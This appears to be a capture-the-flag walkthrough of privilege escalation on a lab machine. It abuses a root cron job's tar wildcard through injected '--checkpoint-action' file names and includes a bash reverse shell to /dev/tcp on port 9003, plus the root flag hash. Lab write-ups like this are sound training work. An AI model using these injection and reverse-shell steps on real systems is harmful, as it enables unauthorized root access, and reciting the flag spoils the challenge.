## Cron Jobs
```
<ml/45kra24zxs28v3yd/administrator$ cat /etc/crontab                         
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

* looks like theres a file `backup.sh` that is owned by root
```
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
* looks like it just zips up everything in the /var/www/html folder into a `.tgz` file
	* important to note this is not calling tar using absolute path. let's abuse this
* we create a file under `/tmp` with the name `tar` with `/bin/sh` in it
* let's put `/tmp` in the very front of the the `$PATH` env variable
```
www-data@skynet:/tmp$ export PATH=/tmp:$PATH
www-data@skynet:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@skynet:/tmp$ chmod +x tar
```

* looks this like doesn't work

## Tar Wildcard Exploit
* we can abuse the wild card in the `tar cf /home/milesdyson/backups/backup.tgz *` command
* using `--checkpoint-action=exec=sh connect.sh
` and `--checkpoint=1` flags we can execute a file called `connect.sh`
* we can create files with the names of these flags
* `/bin/bash -c "bash -i >& /dev/tcp/10.18.79.167/9003 0>&1" connect.sh`
	* reverse shell command
* `echo "" > --checkpoint=1`
	* show progress message on every checkpoint number specified
* `echo "" > "--checkpoint-action=exec=sh connect.sh"`
	* execute `connect.sh` file at every checkpoint
* wait one minute..
* root.txt - `3f0372db24753accc7179a282cd6a949`

